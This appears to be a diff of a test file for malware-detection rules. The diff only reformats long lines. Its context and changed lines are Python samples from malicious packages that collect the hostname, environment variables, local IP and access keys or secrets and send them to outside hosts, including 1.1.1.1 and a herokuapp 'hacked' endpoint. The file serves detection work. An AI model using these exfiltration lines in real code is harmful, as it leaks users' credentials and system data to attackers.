@@ -58,7 +58,9 @@ requests.get("http://1.1.1.1/" + creds)
 """ RULEID: distrib malware
 """
 info = socket.gethostname() + " " + " ".join(["%s=%s" % (k, v) for (k, v) in os.environ.items()]) + " "
-info += [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
+info += [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][
+    0
+][1]
 posty = "paste="
 for i in xrange(0, len(info)):
     if info[i].isalnum():
@@ -127,7 +129,9 @@ def checkVersion():
     elif platform.system() is "Linux":
         loc_lang = os.popen("echo $LANG")
         language = loc_lang.rea
-    ip = [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
+    ip = [
+        (s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
+    ][0][1]
     package = "pysprak"
     vid = user_name + "###" + hostname + "###" + os_version + "###" + ip + "###" + package
     if sys.version_info > (3, 0):
@@ -195,7 +199,9 @@ class Ctx(dict):
 
     def sendRequest(self):
         # todoruleid: exfiltrate-sensitive-data
-        response = requests.get("https://anti-theft-web[.]herokuapp.com/hacked/" + self.name + "/" + self.access + "/" + self.secret)
+        response = requests.get(
+            "https://anti-theft-web[.]herokuapp.com/hacked/" + self.name + "/" + self.access + "/" + self.secret
+        )
 
 
 # Should not match as we only use a single env variable
